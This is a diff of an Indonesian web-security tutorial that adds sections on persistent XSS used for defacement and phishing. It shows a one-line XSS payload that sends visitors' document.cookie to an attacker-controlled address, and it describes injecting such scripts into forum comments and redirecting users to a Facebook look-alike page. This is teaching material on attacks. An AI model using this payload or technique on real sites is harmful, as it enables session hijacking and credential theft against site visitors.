@@ -26,9 +26,13 @@ Event Dadakan 7 January 2021
       - Infected USB Attack
       - Malware Execution
       - Remote Access Trojan (RAT)
+    - File Upload Vulnerability
+    - 
     - Injection - XSS
+      - XSS Attack Type
       - Innocent Code
       - Session Hijacking
+      - Phising
       - XSS Cheatsheet
 
 # Web Security
@@ -170,9 +174,19 @@ Pada **Malware** **Tojan** varian lain.. terdapat fitur yang dapat mengirimkan p
 
 <img src="assets/RAT1.png" style="zoom:100%;" />
 
+### File Upload Vulnerability
+
+
+
 ### Injection - XSS
 
-**Website Defacement** juga dapat terjadi karena serangan **XSS**.
+#### XSS Attack Type
+
+**Website Defacement** juga dapat terjadi karena serangan **XSS**. 
+
+Serangan dengan tipe **Persistent XSS Attack** dapat digunakan untuk melakukan **Website Defacement**, sebab **malicious script** tersimpan di server. **Website Defacement** dapat menyeluruh atau Substansial saja pada **element HTML** tertentu.
+
+<img src="assets/xss3.png" style="zoom:100%;" />
 
 Serangan **XSS**, terjadi pada **surface client side**. Penyerang akan menyisipkan **malicious script** ke dalam **website** yang legit di mata pengunjung (korban). Jika serangan berhasil dilakukan dan tidak diketahui oleh **developer web application** itu sendiri, selanjutnya serangan terjadi saat korban mengunjungi **web application** yang telah terinfeksi **XSS Attack**. 
 
@@ -219,7 +233,11 @@ Di bawah ini adalah contoh **malicious script** yang dapat digunakan untuk membu
 <script>new Image().src="http://192.168.129.11/mimiperi.php?output="+document.cookie;</script>
 ```
 
-Ini hanyalah salah satu contoh dampak yang dapat ditimbulkan dari serangan XSS Attack yang kombinasinya dan kerumitannya bisa variatif, misal XSS Attack agar bisa melakukan phising.
+**Malicious Script** di atas dapat diinjeksikan dimana saja, **arbitrary attack** dapat dilakukan misal pada kolom komentar dalam forum, **ecommerce** yang akhirnya menimbulkan ratusan ribu atau pengguna lainnya terpancing untuk melakukan klik **HTML element** di atas. Sekali lagi **Persistent XSS Attack is killer**.
+
+#### Phising
+
+Ini hanyalah salah satu contoh dampak yang dapat ditimbulkan dari serangan **XSS Attack** yang kombinasinya dan kerumitannya bisa variatif, misal **XSS Attack** agar bisa melakukan serangan **phising**. Logikanya sama seperti di atas namun mengarahkan user ke alamat yang desain websitenya misal sama persis seperti facebook.
 
 #### XSS Cheatsheet
 
